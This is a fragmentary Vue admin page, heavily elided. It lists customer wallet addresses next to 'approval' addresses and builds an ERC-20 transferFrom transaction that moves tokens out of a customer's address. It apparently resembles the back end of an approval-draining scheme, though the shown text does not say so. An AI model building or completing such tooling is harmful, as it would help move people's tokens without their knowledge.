	...
	<div>
		...
		<div class="gva-table-box">
			...
			<el-table :data="tableData" @sort-change="sortChange" @selection-change="handleSelectionChange">
				...
				<el-table-column align="left" label="客户地址" min-width="350" sortable="custom" >
          <template #default="scope">
            <a :href="'https://etherscan.io/address/'+scope.row.customerAddress"  target="_blank" >{{scope.row.customerAddress}}</a>
				...
				<el-table-column align="left" label="授权地址" min-width="350" sortable="custom" >
        <template #default="scope">
          <a :href="'https://etherscan.io/address/'+scope.row.approvalAddress"  target="_blank" >{{scope.row.approvalAddress}}</a>
				...
				<el-table-column align="left" fixed="right" label="操作" width="300">
					<template #default="scope">
						...
						<el-button icon="delete" type="primary" link @click="deleteApiFunc(scope.row)">刷新</el-button>
...
<script setup>
	...
	//transfAmount.value 
		...
		const data = iface.encodeFunctionData("transferFrom", [
		  ...
		  const nonce=ethersProvider.getTransactionCount(customerAddress.value)
		  console.log('nonce',nonce)
		const signer = ethersProvider.getSigner()
		 const transaction = {
		    to: approveAddr, // The transaction will be sent to the USDC contract address
